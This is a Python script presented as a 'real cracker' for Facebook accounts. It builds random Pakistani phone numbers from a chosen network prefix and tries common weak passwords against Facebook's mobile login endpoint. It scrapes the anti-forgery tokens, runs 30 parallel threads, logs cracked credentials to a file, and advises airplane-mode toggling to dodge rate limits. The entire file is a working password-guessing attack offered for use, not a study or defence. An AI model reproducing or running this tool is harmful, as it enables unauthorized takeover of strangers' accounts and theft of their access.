import os, sys, time, random, re
try:
    import requests
except ImportError:
    os.system('pip install requests')
    import requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool

# --- Real Headers (Mobile Device Simulation) ---
def get_headers():
    return {
        'authority': 'm.facebook.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://m.facebook.com',
        'referer': 'https://m.facebook.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    }

def menu():
    os.system('clear')
    print("\033[1;92m--- BASIT SYCO REAL CRACKER ---")
    print("\033[1;37mConfirm Method: Mobile API Request")
    print("-----------------------------------")
    print("[1] Random Number Cloning (Pakistan)")
    print("[0] Exit")
    opt = input("\nSelect Option: ")
    if opt == '1':
        real_start()
    else:
        sys.exit()

def real_start():
    os.system('clear')
    print("\033[1;32mExample: 0300, 0301, 0345")
    code = input("\033[1;37mEnter Network Code: ")
    print("\033[1;32mExample: 1000, 2000, 5000")
    limit = int(input("\033[1;37mHow many IDs to check?: "))
    
    print("\n\033[1;94m--- Cloning Started (Real Mode) ---")
    print("\033[1;31mNote: Use Aeroplane Mode after 100 IDs\n")
    
    with ThreadPool(max_workers=30) as pool:
        for _ in range(limit):
            num = code + str(random.randint(1111111, 9999999))
            pwx = [num, "pakistan", "khan123", "khan786"] 
            pool.submit(login_check, num, pwx)

def login_check(num, pwx):
    for pas in pwx:
        try:
            session = requests.Session()
            # Step 1: Get Login Page
            free_fb = session.get('https://m.facebook.com').text
            
            # Step 2: Extract Security Tokens
            lsd = re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1)
            jazoest = re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1)
            
            data = {
                "lsd": lsd,
                "jazoest": jazoest,
                "email": num,
                "pass": pas,
                "login": "Log In"
            }
            
            # Step 3: Post Real Login Request
            response = session.post('https://m.facebook.com/login/device-based/regular/login/', data=data, headers=get_headers(), allow_redirects=False)
            
            if "c_user" in session.cookies.get_dict():
                print(f"\r\033[1;92m[BASIT-OK] {num} | {pas}      ")
                open('ok.txt', 'a').write(num+'|'+pas+'\n')
                break
            elif "checkpoint" in session.cookies.get_dict():
                print(f"\r\033[1;93m[BASIT-CP] {num} | {pas} (Check ID) ")
                break
            else:
                sys.stdout.write(f"\r\033[1;37m[Checking] {num} | {pas} ")
                sys.stdout.flush()
        except:
            pass

if __name__ == "__main__":
    menu()
